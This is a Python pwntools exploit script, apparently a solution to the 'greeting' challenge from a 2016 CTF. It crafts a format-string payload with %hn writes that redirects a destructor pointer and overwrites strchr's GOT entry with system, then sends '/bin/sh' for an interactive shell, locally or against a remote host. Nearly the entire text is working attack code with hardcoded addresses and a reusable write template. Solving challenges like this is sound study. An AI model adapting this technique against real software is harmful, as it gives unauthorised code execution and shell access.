#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
    
    dtor = 0x8049934
    getnline_call = 0x8048614
    strchrgot_low  = 0x8049a50
    strchrgot_high = 0x8049a52

    system = 0x8048490        

    # write 1:
    # set dtor = getnline_call
    
    # write 2:
    # set strchr@got = system@plt  
    # must be 4-byte aligned because want TARGET ADDRS to be dword aligned!
    payload  = "%343" # width                   # 23
    payload += "06x%"                           # 24
    payload += "33$h" # 33rd param              # 25
    payload += "n%65"                           # 26
    payload += "148x"                           # 27
    payload += "%34$"                           # 28
    payload += "hn%3"                           # 29
    payload += "3652"                           # 30
    payload += "x%35"                           # 31
    payload += "$hnA"                           # 32
    
    # TARGET ADDRS
    payload += p32(dtor)                        # 33
    payload += p32(strchrgot_low)               # 34
    payload += p32(strchrgot_high)              # 35
    
    r.sendlineafter("...",payload)
    r.sendline("/bin/sh\0") 
     

    '''
    %2343x
    %7$hn
    %23423x
    %8$hn
    %2342x
    %9$hn
    p32(addr)#7
    p32(addr)#8
    p32(addr)#9
    '''

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/vagrant/CTFs/mmactf16/greeting/greeting'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
